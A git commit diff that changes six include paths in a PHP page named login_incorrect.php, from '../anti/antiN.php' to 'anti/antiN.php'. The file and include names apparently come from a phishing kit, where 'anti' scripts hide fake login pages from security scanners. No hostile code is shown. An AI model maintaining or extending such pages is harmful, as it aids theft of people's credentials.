8fc0d4fe11d2fce8af635077882419c78b53f99d
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-10-14 10:01:35 +0200

    Update login_incorrect.php

--- login_incorrect.php
+++ login_incorrect.php
@@ -1,13 +1,11 @@
 <?php
 session_start();
-include "../anti/anti1.php";
-include "../anti/anti2.php"; 
-include "../anti/anti3.php"; 
-include "../anti/anti4.php"; 
-include "../anti/anti5.php"; 
-include "../anti/anti7.php"; 
-
-
+include "anti/anti1.php";
+include "anti/anti2.php"; 
+include "anti/anti3.php"; 
+include "anti/anti4.php"; 
+include "anti/anti5.php"; 
+include "anti/anti7.php"; 
 ?>
 <!DOCTYPE html>
 <html lang="en"><head>
